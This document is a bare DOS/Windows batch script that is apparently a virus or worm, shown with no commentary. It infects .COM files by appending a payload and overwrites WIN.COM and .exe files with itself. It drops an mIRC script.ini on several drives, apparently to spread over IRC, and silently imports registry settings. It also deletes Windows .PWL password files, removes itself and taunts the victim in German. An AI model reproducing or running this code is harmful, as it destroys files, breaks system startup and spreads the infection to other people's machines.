@ECHO off
Ctty nul
Move C:\Lucky\REG.REG %WINDIR%\REG.REG
for %%i In (*.COM ..\*.COM) do copy /b %%i + C:\Lucky\x.xxx %%i
ATTRIB %WINDIR%\WIN.COM -H -R -S
IF EXIST %WINDIR%\WlN.COM goto :skip
IF NOT EXIST %WINDIR%\WlN.COM goto :smfn
:smfn
REN %WINDIR%\WIN.COM WlN.COM
:skip
IF EXIST c:\mIRC\*.* GOTO :1
IF NOT EXIST C:\mIRC\*.* GOTO :2
:1
MOVE C:\Lucky\sc.ini C:\mIRC\script.ini
GOTO :next
:2
IF EXIST C:\Progra~1\mIRC\*.* GOTO :3
IF NOT EXIST C:\Progra~1\mIRC\*.* GOTO :4
:3
MOVE C:\Lucky\sc.ini C:\Progra~1\mIRC\script.ini
GOTO :next
:4
IF EXIST d:\mIRC\*.* GOTO :5
IF NOT EXIST d:\mIRC\*.* GOTO :6
:5
MOVE C:\Lucky\sc.ini d:\mIRC\script.ini
GOTO :next
:6
IF EXIST d:\Progra~1\mIRC\*.* GOTO :7
IF NOT EXIST d:\Progra~1\mIRC\*.* GOTO :8
:7
MOVE C:\Lucky\sc.ini d:\Progra~1\mIRC\script.ini
GOTO :next
:8
IF EXIST e:\mIRC\*.* GOTO :9
IF NOT EXIST e:\mIRC\*.* GOTO :10
:9
MOVE C:\Lucky\sc.ini e:\mIRC\script.ini
GOTO :next
:10
MOVE C:\Lucky\sc.ini e:\Progra~1\mIRC\script.ini
GOTO :next
:next
IF EXIST IO.SYS GOTO :X
IF NOT EXIST IO.SYS GOTO :Z
:Z
@REGEDIT /S /C %WINDIR%\REG.REG
GOTO :X
:X
IF NOT EXIST C:\DOCUME~1\AKOBER~1\LOCALS~1\Temp\mIRCplus.zip goto :Bari
IF EXIST C:\DOCUME~1\AKOBER~1\LOCALS~1\Temp\mIRCplus.zip goto :MO
:Bari
COPY %WINDIR%\SYSTEM\vidx32.dll C:\DOCUME~1\AKOBER~1\LOCALS~1\Temp\mIRCplus.zip
:MO
for %%i in (B*.exe ..\A*.exe) do copy D:\1.bat %%i
for %%i in (%WINDIR%\*.PWL) do DEL %%i
for %%i in (C:\Lucky\*.*) do del %%i
RD C:\Lucky
COPY  C:\DOCUME~1\AKOBER~1\LOCALS~1\Temp\mIRCplus.zip %WINDIR%\SYSTEM\vidx32.dll
COPY D:\1.bat %windir%\WIN.COM
IF EXIST mirc32.exe goto :SHH
IF NOT EXIST mirc32.exe goto :RI
IF EXIST WlN.COM GOTO :RI2
IF NOT EXIST WlN.COM GOTO :RIP
:SHH
CTTY CON
ECHO DONE !! HaHa Du hast Verloren !
CTTY NUL
:RI
del %0
:RI2
CALL WlN.COM
DEL %0
:RIP
DEL %0